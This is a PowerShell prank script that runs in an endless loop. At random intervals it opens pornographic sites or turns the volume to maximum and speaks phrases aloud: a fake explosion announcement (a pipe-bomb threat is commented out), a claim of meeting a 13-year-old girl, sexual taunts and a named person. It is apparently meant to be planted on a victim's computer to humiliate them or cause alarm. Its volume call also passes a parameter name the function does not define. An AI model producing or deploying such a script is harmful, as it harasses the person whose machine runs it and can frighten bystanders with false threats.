# Setup TTS etc
Add-Type -AssemblyName System.Speech
$speaker = New-Object System.Speech.Synthesis.SpeechSynthesizer
function set_AudioLevel($audioLevel){$wshShell = new-object -com wscript.shell; 1..50 | % {$wshShell.SendKeys([char]174)}; $audioLevel = $audioLevel / 2;1..$audioLevel | % {$wshShell.SendKeys([char]175)}}

while ($true){
    # Sleep for a random amount of time
    $randomWaitTime = Get-Random -Minimum 10 -Maximum 300
    Start-Sleep -Seconds $randomWaitTime

    # Decide action
    $randomNumber = Get-Random -Minimum 1 -Maximum 10

    if ($randomNumber -eq 1){
        explorer.exe "https://porn.tgm.one"
    } elseif ($randomNumber -eq 2){
        set_AudioLevel -Volume 100
        #$speaker.Speak("I HAVE A PIPE BOMB THIS IS NOT A JOKE THERE IS A PIPE BOMB IN MY BACKPACK IT IS PRIMED TO EXPLODE")
        $speaker.Speak("AN EXPLOSIVE I PLANTED IN THE BUILDING HAS GONE OFF THERE IS AN EXPLOSION IN THIS BUILDING... IN MY PANTS I HAVE SHAT MY PANTS THERE HAS BEEN A POOPY EXPLOSION IN MY PANTS CLEAN UP AISLE MY PANTS")
    } elseif ($randomNumber -eq 3){
        set_AudioLevel -Volume 100
        $speaker.Speak("I HAVE BEEN EDGING FOR 48 HOURS IM GOING TO BUST ALL OVER")
    } elseif ($randomNumber -eq 4){
        set_AudioLevel -Volume 100
        $speaker.Speak("BATTERY LOW BATTERY LOW BATTERY LOW BATTERY LOW CHARGE BLUETOOTH INTEGRATED HIGH SPEED OSCILLATING ANAL SUPPOSITORY BATTERY LOW BATTERY LOW BATTERY LOW")
    } elseif ($randomNumber -eq 5){
        set_AudioLevel -Volume 100
        $speaker.Speak("DOWNLOADING GAY PORN DOWNLOADING GAY PORN GAY PORN DOWNLOAD IN PROGRESS DOWNLOADING MIDGET PORN DOWNLOADING GAY MIDGET PORN")
    } elseif ($randomNumber -eq 6){
        set_AudioLevel -Volume 100
        $speaker.Speak("RICHARD JOYCE THE THIRD RICHARD JOYCE THE THIRD RICHARD JOYCE THE THIRD ")
    } elseif ($randomNumber -eq 7){
        set_AudioLevel -Volume 100
        $speaker.Speak("I AM HERE TO MEET A 13 YEAR OLD GIRL")
    } elseif ($randomNumber -eq 8){
        explorer.exe "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    } elseif ($randomNumber -eq 9){
        explorer.exe "https://porn.tgm.one/shop"
    }
}
